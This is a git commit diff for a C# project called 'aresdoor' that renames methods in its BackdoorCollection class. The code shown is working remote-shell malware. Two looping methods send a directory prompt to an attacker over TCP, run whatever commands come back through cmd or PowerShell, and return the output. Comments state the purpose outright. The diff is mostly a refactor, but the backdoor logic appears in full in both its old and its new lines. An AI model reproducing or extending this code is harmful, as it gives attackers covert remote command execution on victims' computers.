8b7209b7e8a3affc282536854f160c575a08ec22
Willy Fox <official.blackvikingpro@gmail.com>
2018-01-13 10:29:31 -0600

    updated to match with proper class/method names

--- aresdoor/BackdoorCollection.cs
+++ aresdoor/BackdoorCollection.cs
@@ -1,9 +1,4 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Net.Sockets;
-using System.Text;
-using System.Threading.Tasks;
 
 namespace aresdoor
 {
@@ -11,50 +6,50 @@ namespace aresdoor
     {
         NetworkCommunication nc = new NetworkCommunication();
 
-        public bool CommandPromptBackdoor(NetworkStream stream)
+        public bool CommandPromptBackdoor(System.Net.Sockets.TcpClient tcpClient)
         {
             while (true)
             {
                 // Send shellcode to attacker
-                nc.dataTravelTO(stream, System.IO.Directory.GetCurrentDirectory() + "> ");
+                nc.DataTravelTO(tcpClient, System.IO.Directory.GetCurrentDirectory() + "> ");
                 // Recieve response from client application
-                string responseFromServer = nc.dataTravelFROM(stream);
+                string responseFromServer = nc.DataTravelFROM(tcpClient);
 
                 if (responseFromServer.Contains("cd"))
                     System.IO.Directory.SetCurrentDirectory(responseFromServer.Split(" ".ToCharArray())[1]);
                 else if (responseFromServer.Contains("exit"))
                     return false;
                 else
-                    try { nc.dataTravelTO(stream, CommandShell.execCommandPrompt(responseFromServer)); } // Execute command and send output to attacker
+                    try { nc.DataTravelTO(tcpClient, CommandShell.execCommandPrompt(responseFromServer)); } // Execute command and send output to attacker
                 #if DEBUG
                     catch (Exception exc) { Console.WriteLine(exc); return false; }
                 #else
-                    catch (Exception) { nc.dataTravelTO(stream, "Command didn't execute."); return false; }
+                    catch (Exception) { nc.DataTravelTO(tcpClient, "Command didn't execute."); return false; }
                 #endif
             }
 
             return false; // Should we ever get here, it's probably because of an error.
         }
 
-        public bool PowershellBackdoor(NetworkStream stream)
+        public bool PowershellBackdoor(System.Net.Sockets.TcpClient tcpClient)
         {
             while (true)
             {
                 // Send shellcode to attacker:
-                nc.dataTravelTO(stream, "PS " + System.IO.Directory.GetCurrentDirectory() + "> ");
+                nc.DataTravelTO(tcpClient, "PS " + System.IO.Directory.GetCurrentDirectory() + "> ");
                 // Recieve response from client application
-                string responseFromServer = nc.dataTravelFROM(stream);
+                string responseFromServer = nc.DataTravelFROM(tcpClient);
 
                 if (responseFromServer.Contains("cd"))
                     System.IO.Directory.SetCurrentDirectory(responseFromServer.Split(" ".ToCharArray())[1]);
                 else if (responseFromServer.Contains("exit"))
                     return false;
                 else
-                    try { nc.dataTravelTO(stream, CommandShell.execPowershellCommand(responseFromServer)); } // Execute command and send output to attacker
+                    try { nc.DataTravelTO(tcpClient, CommandShell.execPowershellCommand(responseFromServer)); } // Execute command and send output to attacker
                 #if DEBUG
                     catch (Exception exc) { Console.WriteLine(exc); return false; }
                 #else
-                    catch (Exception) { nc.dataTravelTO(stream, "Command didn't execute."); return false; }
+                    catch (Exception) { nc.DataTravelTO(tcpClient, "Command didn't execute."); return false; }
                 #endif
             }
 
